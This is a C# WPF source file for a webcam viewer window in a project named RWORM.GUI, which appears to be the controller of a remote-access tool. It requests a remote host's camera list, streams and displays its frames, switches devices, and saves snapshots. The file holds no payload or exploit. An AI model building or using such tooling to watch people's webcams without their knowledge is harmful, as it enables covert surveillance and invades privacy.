using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Media.Imaging;
using Microsoft.Win32;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class WebcamWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string           _guid;
        private bool _paused;
        private bool _closed;
        private int  _frames;
        private int  _currentDevice = 0;
        private byte[]? _latestFrame;

        public class DeviceItem
        {
            public int Index { get; set; }
            public string Name { get; set; } = string.Empty;
            public override string ToString() => Name;
        }

        public WebcamWindow(ServerConnection server, string guid, string hostname)
        {
            InitializeComponent();
            _server = server;
            _guid   = guid;
            Title   = $"Webcam — {hostname}";
            TitleLabel.Text = hostname;

            _server.RegisterWebcamDevicesHandler(_guid, OnDevicesReceived);
            _server.RegisterWebcamFrameHandler(_guid, OnFrameReceived);

            _ = _server.RequestWebcamDevices(_guid);
            _ = _server.StartWebcam(_guid, _currentDevice);
            StatusLabel.Text = "Starting webcam stream...";
        }

        private void OnDevicesReceived(byte[] data)
        {
            try
            {
                var json = Encoding.UTF8.GetString(data);
                using var doc = JsonDocument.Parse(json);
                var list = new List<DeviceItem>();
                foreach (var el in doc.RootElement.EnumerateArray())
                {
                    list.Add(new DeviceItem
                    {
                        Index = el.GetProperty("index").GetInt32(),
                        Name = el.GetProperty("name").GetString() ?? "Webcam"
                    });
                }

                Dispatcher.BeginInvoke(new Action(() =>
                {
                    DeviceCombo.ItemsSource = list;
                    if (list.Count > 0 && DeviceCombo.SelectedIndex < 0)
                        DeviceCombo.SelectedIndex = 0;
                }));
            }
            catch { }
        }

        private void DeviceCombo_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (DeviceCombo.SelectedItem is DeviceItem dev && dev.Index != _currentDevice)
            {
                _currentDevice = dev.Index;
                _ = _server.StartWebcam(_guid, _currentDevice);
                StatusLabel.Text = $"Switched to device {_currentDevice}: {dev.Name}";
            }
        }

        private void OnFrameReceived(byte[] jpegBytes)
        {
            if (_closed || _paused || jpegBytes.Length == 0) return;
            _latestFrame = jpegBytes;

            Dispatcher.BeginInvoke(new Action(() =>
            {
                try
                {
                    using var ms = new MemoryStream(jpegBytes);
                    var bmp = new BitmapImage();
                    bmp.BeginInit();
                    bmp.CacheOption = BitmapCacheOption.OnLoad;
                    bmp.StreamSource = ms;
                    bmp.EndInit();
                    bmp.Freeze();

                    CamView.Source = bmp;
                    PlaceholderText.Visibility = Visibility.Collapsed;
                    _frames++;
                    FrameCountLabel.Text = _frames.ToString();
                    StatusLabel.Text = $"Streaming — {bmp.PixelWidth}x{bmp.PixelHeight} ({jpegBytes.Length / 1024} KB)";
                }
                catch { }
            }));
        }

        private void Pause_Click(object sender, RoutedEventArgs e)
        {
            _paused = !_paused;
            PauseBtn.Content = _paused ? "▶ Resume" : "⏸ Pause";
            StatusLabel.Text = _paused ? "Paused" : "Resumed stream";
        }

        private void Snapshot_Click(object sender, RoutedEventArgs e)
        {
            if (_latestFrame == null || _latestFrame.Length == 0)
            {
                MessageBox.Show("No frame captured yet.", "Snapshot", MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }

            var dlg = new SaveFileDialog
            {
                Filter = "JPEG Image|*.jpg",
                FileName = $"webcam_{DateTime.Now:yyyyMMdd_HHmmss}.jpg"
            };

            if (dlg.ShowDialog() == true)
            {
                try
                {
                    File.WriteAllBytes(dlg.FileName, _latestFrame);
                    MessageBox.Show("Snapshot saved successfully!", "Snapshot", MessageBoxButton.OK, MessageBoxImage.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Failed to save: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        protected override void OnClosed(EventArgs e)
        {
            _closed = true;
            _server.UnregisterWebcamDevicesHandler(_guid);
            _server.UnregisterWebcamFrameHandler(_guid);
            _ = _server.StopWebcam(_guid);
            base.OnClosed(e);
        }
    }
}
